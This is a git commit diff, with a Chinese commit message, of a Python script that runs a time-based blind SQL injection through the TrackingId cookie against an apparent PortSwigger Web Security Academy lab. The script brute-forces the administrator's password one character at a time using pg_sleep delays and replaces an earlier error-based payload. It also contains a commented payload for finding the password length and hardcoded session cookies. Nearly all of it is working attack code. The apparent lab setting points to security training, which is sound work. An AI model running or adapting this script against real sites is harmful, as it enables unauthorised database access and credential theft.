606a53e639156b92d5e9bd790f692761f01c8c17
xiduo666 <2504340326@wtu.edu.cn>
2026-08-08 21:18:00 +0800

    更新 blind+SQL.py：改用时间延迟盲注并重构循环

--- blind+SQL.py
+++ blind+SQL.py
@@ -8,18 +8,29 @@ proxies = {
 }
 
 
-url = "https://0a51002f04dd90d980bd03ab00a60085.web-security-academy.net/filter?category=Tech+gifts"
+url = "https://0a4000da0408932c802f80e600b20010.web-security-academy.net/filter?category=Gifts"
 
 chars="abcdefghijklmnopqrstuvwxyz0123456789"
 password=[]
+
+# payload="' and (select case when length(password)=20 then pg_sleep(3) else pg_sleep(0) end from users limit 1) is not NULL--"
+
+# r=requests.get(url,cookies={"TrackingId":f"ZjCkDCP815ZVNRWk{payload}","session":"E7T3tLsw8ksbPQZ2wzmxjqocK9SVGTPn"},proxies=proxies,verify=False,timeout=10)
+
+# if r.elapsed.total_seconds()>3:
+#     print("Password length is 20")
+
+
+sum=0
 for index in range(1,21):
-    print("1")
+    sum+=1
+    print(sum)
     for c in chars:
-        payload=f"' || (select case when substr(password,{index},1)='{c}' then to_char(1/0) else '' end from users where username='administrator')--"
+        payload=f"' and (select case when substr(password,{index},1)='{c}' then pg_sleep(3) else pg_sleep(0) end from users limit 1) is not NULL--"
 
         r = requests.get(url, cookies={"TrackingId":f"wW5i876igizsvood{payload}", "session":"vt6Ivom8ttakN2jXzr3tEBYhqR7prB3v"}, proxies=proxies, verify=False, timeout=10)
 
-        if r.status_code==500:
+        if r.elapsed.total_seconds()>3:
             password.append(c)
             break
 
